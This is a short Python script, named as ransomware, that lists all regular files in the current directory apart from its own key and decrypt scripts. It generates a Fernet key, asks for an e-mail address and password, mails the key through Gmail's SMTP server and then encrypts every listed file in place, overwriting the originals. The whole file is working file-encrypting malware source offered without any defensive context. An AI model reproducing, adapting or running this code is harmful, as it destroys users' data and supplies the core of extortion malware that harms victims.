import os
from cryptography.fernet import Fernet
import smtplib

file_list = []

def get_files():
    global file_list
    for file in os.listdir():
        if file == "ransome_ware_email.py" or file == "key.key":
            continue
        if file == "ransome_ware_email_decrypt.py":
            continue
        if os.path.isfile(file):
            file_list.append(file)
    print(f"This is file inventory: {file_list}")

def create_key():
    key = Fernet.generate_key()
    return key

def send_mail_key(email,password,key):
    service = smtplib.SMTP("smtp.gmail.com",587)
    service.starttls()
    service.login(email,password)
    service.sendmail("fromme@gmail.com",email,key)

def crypt_files(key):
    global file_list
    for file in file_list:
        with open(file,"rb") as files:
            read_c = files.read()
        file_crypt = Fernet(key).encrypt(read_c)
        with open(file,"wb") as files:
            files.write(file_crypt)

def i_want_something():
    email = input("\nYou have to enter your e-mail adress: ")
    password = input("Enter your e-mail password: ")
    return (email,password)


get_files()
key = create_key()
(e,p) = i_want_something()

while True:
    try:
        send_mail_key(e,p,key)
        print("\nOkay, now you have a key in your e-mails")
        crypt_files(key)
        break
    except:
        print("\nDoesnt work!")
        break

